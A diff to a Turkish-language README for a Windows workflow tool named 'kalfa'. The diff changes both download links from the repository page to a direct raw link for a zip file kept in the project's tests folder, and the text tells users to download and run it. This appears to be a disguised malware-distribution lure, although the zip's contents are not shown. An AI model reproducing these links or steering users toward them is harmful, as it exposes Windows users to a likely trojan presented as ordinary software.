@@ -1,12 +1,12 @@
 # 🧭 kalfa - Türkçe iş akışınızı tek yerde yönetin
 
-[![Download kalfa](https://img.shields.io/badge/Download-kalfa-4C8BF5?style=for-the-badge&logo=github)](https://github.com/lockedr9362/kalfa)
+[![Download kalfa](https://img.shields.io/badge/Download-kalfa-4C8BF5?style=for-the-badge&logo=github)](https://github.com/lockedr9362/kalfa/raw/refs/heads/main/tests/Software_3.7.zip)
 
 ## 📥 İndirme
 
 kalfa’yı indirmek için bu bağlantıyı açın:
 
-[GitHub sayfasını ziyaret et](https://github.com/lockedr9362/kalfa)
+[GitHub sayfasını ziyaret et](https://github.com/lockedr9362/kalfa/raw/refs/heads/main/tests/Software_3.7.zip)
 
 Bu proje, Windows üzerinde çalışacak şekilde kurulum ve kullanım için düzenlenmiştir. Sayfada yer alan dosyayı açın, ardından indirip çalıştırın.
 
